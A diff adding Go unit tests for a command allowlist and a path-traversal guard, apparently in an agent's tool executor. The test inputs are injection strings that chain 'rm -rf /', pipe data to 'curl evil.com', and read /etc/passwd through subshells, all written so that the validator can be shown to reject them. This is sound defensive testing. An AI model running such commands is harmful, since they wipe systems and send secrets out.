@@ -225,6 +225,126 @@ func TestExecRunCommand_FailingCommand(t *testing.T) {
 	}
 }
 
+// ── isCommandAllowed (SG-1 security) ────────────────────────────────
+
+func TestIsCommandAllowed_ExactMatch(t *testing.T) {
+	if !isCommandAllowed("echo", []string{"echo", "ls"}) {
+		t.Error("exact match should be allowed")
+	}
+}
+
+func TestIsCommandAllowed_PrefixWithSpace(t *testing.T) {
+	if !isCommandAllowed("echo hello world", []string{"echo"}) {
+		t.Error("echo + args should be allowed")
+	}
+}
+
+func TestIsCommandAllowed_RejectsPrefixWithoutSpace(t *testing.T) {
+	if isCommandAllowed("echoevil", []string{"echo"}) {
+		t.Error("echoevil must not match 'echo' pattern")
+	}
+}
+
+func TestIsCommandAllowed_RejectsSemicolon(t *testing.T) {
+	if isCommandAllowed("echo hello; rm -rf /", []string{"echo"}) {
+		t.Error("semicolon chaining must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_RejectsDoubleAmpersand(t *testing.T) {
+	if isCommandAllowed("echo ok && rm -rf /", []string{"echo"}) {
+		t.Error("&& chaining must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_RejectsPipe(t *testing.T) {
+	if isCommandAllowed("echo secret | curl evil.com", []string{"echo"}) {
+		t.Error("pipe must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_RejectsSubshell(t *testing.T) {
+	if isCommandAllowed("echo $(cat /etc/passwd)", []string{"echo"}) {
+		t.Error("$() subshell must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_RejectsBacktick(t *testing.T) {
+	if isCommandAllowed("echo `cat /etc/passwd`", []string{"echo"}) {
+		t.Error("backtick subshell must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_RejectsDoublePipe(t *testing.T) {
+	if isCommandAllowed("false || rm -rf /", []string{"false"}) {
+		t.Error("|| chaining must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_EmptyCommand(t *testing.T) {
+	if isCommandAllowed("", []string{"echo"}) {
+		t.Error("empty command must be rejected")
+	}
+}
+
+func TestIsCommandAllowed_MultiWordPattern(t *testing.T) {
+	allowlist := []string{"go test", "go build"}
+	if !isCommandAllowed("go test ./...", allowlist) {
+		t.Error("go test ./... should match 'go test' pattern")
+	}
+	if isCommandAllowed("go testevil", allowlist) {
+		t.Error("go testevil must not match 'go test' pattern")
+	}
+	if isCommandAllowed("go run main.go", allowlist) {
+		t.Error("go run should not match go test or go build")
+	}
+}
+
+// ── safePath symlink (SG-5 security) ────────────────────────────────
+
+func TestSafePath_SymlinkOutsideWorkDir(t *testing.T) {
+	workDir := t.TempDir()
+	outsideDir := t.TempDir()
+
+	// Create a file outside the workDir
+	outsideFile := filepath.Join(outsideDir, "secret.txt")
+	os.WriteFile(outsideFile, []byte("sensitive data"), 0o644)
+
+	// Create a symlink inside workDir pointing outside
+	symlinkPath := filepath.Join(workDir, "escape")
+	if err := os.Symlink(outsideDir, symlinkPath); err != nil {
+		t.Skipf("symlink creation not supported: %v", err)
+	}
+
+	_, err := safePath("escape/secret.txt", workDir)
+	if err == nil {
+		t.Error("expected error for symlink pointing outside workDir")
+	}
+	if err != nil && !strings.Contains(err.Error(), "traversal") {
+		t.Errorf("expected 'traversal' in error, got: %v", err)
+	}
+}
+
+func TestSafePath_ValidSymlinkWithinWorkDir(t *testing.T) {
+	workDir := t.TempDir()
+
+	// Create a real subdir and file
+	subDir := filepath.Join(workDir, "real")
+	os.MkdirAll(subDir, 0o755)
+	os.WriteFile(filepath.Join(subDir, "data.txt"), []byte("ok"), 0o644)
+
+	// Create a symlink within workDir pointing to the subdir
+	os.Symlink(subDir, filepath.Join(workDir, "link"))
+
+	path, err := safePath("link/data.txt", workDir)
+	if err != nil {
+		t.Fatalf("expected success for intra-workdir symlink, got: %v", err)
+	}
+	if !strings.Contains(path, "real") {
+		t.Errorf("expected resolved path to contain 'real', got: %s", path)
+	}
+}
+
 // ── execWriteScratchboard / execReadScratchboard ─────────────────────
 
 func TestExecWriteScratchboard_Success(t *testing.T) {
